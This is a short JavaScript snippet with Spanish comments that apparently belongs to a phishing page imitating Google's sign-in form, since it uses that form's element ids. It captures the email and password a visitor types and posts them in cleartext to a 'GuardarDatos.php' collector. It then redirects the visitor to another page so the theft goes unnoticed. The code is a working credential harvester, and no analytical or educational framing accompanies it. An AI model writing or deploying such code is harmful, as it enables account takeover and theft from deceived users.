document.getElementById("identifierNext").addEventListener("click", function(event) {
    event.preventDefault(); // Evitar que el formulario se envíe automáticamente
    var email = document.getElementById("identifierId").value;
    var password = document.getElementById("passwordId").value;
    
    // Aquí puedes hacer una validación de los datos antes de enviarlos

    // Envía los datos al servidor
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "GuardarDatos.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Aquí puedes redirigir a la página que desees
                window.location.href = "pagina_mensaje.html";
            } else {
                // Manejar el caso en que la solicitud no sea exitosa
                console.error("Error al enviar los datos al servidor.");
                // Redirigir al usuario de vuelta a la ventana inicial
                window.location.href = "index.html";
            }
        }
    };
    xhr.send("email=" + email + "&password=" + password);
});
